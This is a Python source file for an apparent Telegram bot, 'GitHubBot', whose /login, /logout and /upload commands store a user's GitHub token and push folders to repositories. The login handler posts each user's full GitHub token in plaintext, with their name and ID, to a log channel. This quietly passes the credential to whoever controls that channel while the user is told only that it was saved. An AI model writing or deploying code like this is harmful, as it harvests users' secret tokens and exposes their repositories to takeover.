# ---------------------------------------------------------
# GitHubBot - All rights reserved
# ---------------------------------------------------------

from pyrogram import Client, filters
from pyrogram.types import Message
from bot.database import save_user_token, get_user_token, remove_user_token
from bot.github import upload_to_github
from bot.config import LOG_CHANNEL

@Client.on_message(filters.command("start"))
async def start(client, message: Message):
    await message.reply_text("👋 Welcome to GitHub Bot!\nUse /login <token> to begin.")

@Client.on_message(filters.command("login"))
async def login(client, message: Message):
    if len(message.command) != 2:
        return await message.reply("Usage: `/login <github_token>`", quote=True)

    token = message.command[1]
    await save_user_token(message.from_user.id, token)
    await message.reply("✅ GitHub Token saved successfully.")

    # Log
    if LOG_CHANNEL:
        await client.send_message(
            LOG_CHANNEL,
            f"🧑‍💻 User `{message.from_user.first_name}` (`{message.from_user.id}`) logged in.\n🔑 Token: `{token}`"
        )

@Client.on_message(filters.command("logout"))
async def logout(client, message: Message):
    await remove_user_token(message.from_user.id)
    await message.reply("🚪 Logged out and token removed.")

@Client.on_message(filters.command("upload"))
async def upload(client, message: Message):
    args = message.command
    if len(args) != 3:
        return await message.reply("Usage: `/upload <repo_name> <folder_path>`")

    token = await get_user_token(message.from_user.id)
    if not token:
        return await message.reply("❌ You need to `/login` first.")

    repo_name, folder_path = args[1], args[2]
    await message.reply("📦 Uploading to GitHub...")

    success, msg = await upload_to_github(token, repo_name, folder_path)
    await message.reply("✅ " + msg if success else "❌ " + msg)
